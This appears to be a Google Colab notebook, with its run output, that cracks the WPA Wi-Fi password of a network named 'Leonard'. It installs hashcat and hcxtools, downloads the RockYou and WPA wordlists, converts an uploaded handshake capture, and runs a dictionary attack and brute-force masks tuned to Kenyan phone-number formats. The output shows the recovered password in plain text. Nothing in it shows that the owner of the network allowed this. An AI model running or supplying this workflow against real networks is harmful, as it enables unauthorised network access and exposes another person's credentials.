<a href="https://colab.research.google.com/github/ronk83952-cmd/General/blob/main/WIFIH%26KG.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

In [1]:
# 1. Install Cracking Tools
!sudo apt-get update
!sudo apt-get install hcxtools hashcat -y

# 2. Connect to Google Drive
from google.colab import drive
import os
drive.mount('/content/drive')

# 3. Create a folder for wordlists if it's not there
wordlist_path = "/content/drive/MyDrive/wifiworklists"
if not os.path.exists(wordlist_path):
    os.makedirs(wordlist_path)
    print(f"Created: {wordlist_path}")
else:
    print(f"Using existing folder: {wordlist_path}")

Get:1 https://cloud.r-project.org/bin/linux/ubuntu jammy-cran40/ InRelease [3,632 B]
Get:2 https://cli.github.com/packages stable InRelease [3,917 B]
Get:3 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64  InRelease [1,581 B]
Get:4 https://cloud.r-project.org/bin/linux/ubuntu jammy-cran40/ Packages [89.0 kB]
Get:5 http://security.ubuntu.com/ubuntu jammy-security InRelease [129 kB]
Get:6 https://cli.github.com/packages stable/main amd64 Packages [357 B]
Get:7 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64  Packages [2,546 kB]
Get:8 https://r2u.stat.illinois.edu/ubuntu jammy InRelease [6,555 B]
Hit:9 http://archive.ubuntu.com/ubuntu jammy InRelease
Get:10 https://r2u.stat.illinois.edu/ubuntu jammy/main all Packages [10.1 MB]
Get:11 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [128 kB]
Get:12 https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu jammy InRelease [18.1 kB]
Hit:13 https://ppa.launchpadcontent.net/graphics-dri

In [2]:
import os

# Links from your Maseno IT guide
wordlists = {
    "RockYou": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
    "ProbableWPA": "https://github.com/danthuluru/wordlists/raw/master/probable-v2-wpa-top4800.txt"
}

for name, url in wordlists.items():
    path = f"{wordlist_path}/{name}.txt"
    if not os.path.exists(path):
        print(f"Downloading {name} to Drive...")
        !wget {url} -O "{path}"
    else:
        print(f"{name} list is already saved in your Drive.")

--2026-04-25 14:32:44--  https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
Resolving github.com (github.com)... 140.82.116.4
Connecting to github.com (github.com)|140.82.116.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-25T15%3A24%3A10Z&rscd=attachment%3B+filename%3Drockyou.txt&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-25T14%3A23%3A55Z&ske=2026-04-25T15%3A24%3A10Z&sks=b&skv=2018-11-09&sig=KH%2FGQOQbsCEsrPp324gXlmBT%2FN4OBY4s3UURtgWAz4A%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NzEzMTE2NCwibmJmIjoxNzc3MTI3NTY0LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ib

In [3]:
from google.colab import files

print("Upload your 'capture-01.cap' file:")
uploaded = files.upload()

for filename in uploaded.keys():
    # Convert the cap file to hashcat format
    print(f"Converting {filename} to Leonard.hc22000...")
    !hcxpcapngtool -o leonard.hc22000 "{filename}" [cite: 14]

Upload your 'capture-01.cap' file:


Saving capture.cap-01.cap to capture.cap-01.cap
Converting capture.cap-01.cap to Leonard.hc22000...
hcxpcapngtool 6.2.5 reading from capture.cap-01.cap...

summary capture file
--------------------
file name................................: capture.cap-01.cap
version (pcap/cap).......................: 2.4 (very basic format without any additional information)
timestamp minimum (GMT)..................: 25.04.2026 09:46:50
timestamp maximum (GMT)..................: 25.04.2026 09:58:37
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
endianness (capture system)...............: little endian
packets inside...........................: 56811
ESSID (total unique).....................: 1
BEACON (total)...........................: 1
BEACON (detected on 2.4 GHz channel).....: 6 
ACTION (total)...........................: 57
PROBERESPONSE (total)....................: 

In [4]:
# Stage 1: Dictionary Attack
print("--- STAGE 1: Dictionary (RockYou) ---")
!hashcat -m 22000 -a 0 leonard.hc22000 "{wordlist_path}/RockYou.txt" --quiet

# Stage 2: 8-Digit Brute Force (Standard Router PINs)
print("--- STAGE 2: 8-Digit Numeric (00000000 - 99999999) ---")
!hashcat -m 22000 -a 3 leonard.hc22000 ?d?d?d?d?d?d?d?d --quiet

# Stage 3: 10-Digit Kenyan Phone Numbers
print("--- STAGE 3: 10-Digit Phone (07XXXXXXXX) ---")
!hashcat -m 22000 -a 3 leonard.hc22000 07?d?d?d?d?d?d?d?d --quiet

# Stage 4: 12-Digit International Format
print("--- STAGE 4: 12-Digit Phone (2547XXXXXXXX) ---")
!hashcat -m 22000 -a 3 leonard.hc22000 2547?d?d?d?d?d?d?d?d --quiet

--- STAGE 1: Dictionary (RockYou) ---
nvmlDeviceGetFanSpeed(): Not Supported

24858b62dd1924ffc343ec6a2e820a7b:1c61d26e6be0:38dead4466cd:Leonard:Princess0
--- STAGE 2: 8-Digit Numeric (00000000 - 99999999) ---
nvmlDeviceGetFanSpeed(): Not Supported

--- STAGE 3: 10-Digit Phone (07XXXXXXXX) ---
nvmlDeviceGetFanSpeed(): Not Supported

--- STAGE 4: 12-Digit Phone (2547XXXXXXXX) ---
nvmlDeviceGetFanSpeed(): Not Supported



In [5]:
# --- FINAL STEP: SHOW THE PASSWORD CLEARLY ---
from IPython.display import display, HTML

# This command checks Hashcat's memory (potfile) for the cracked password
result = !hashcat -m 22000 leonard.hc22000 --show

if result:
    # Splitting the result to get just the password part
    password = result[0].split(':')[-1]
    display(HTML(f"<div style='border:5px solid #4CAF50; padding:20px; text-align:center;'>"))
    display(HTML(f"<h1 style='color: #2E7D32; font-size: 50px;'>SUCCESS!</h1>"))
    display(HTML(f"<p style='font-size: 30px;'>The Password for Leonard is:</p>"))
    display(HTML(f"<p style='font-size: 60px; font-weight: bold; color: #d32f2f;'>{password}</p>"))
    display(HTML(f"</div>"))
else:
    display(HTML(f"<h1 style='color: #d32f2f;'>PASSWORD NOT FOUND YET</h1>"))
    print("Try running the next Stage of the crack.")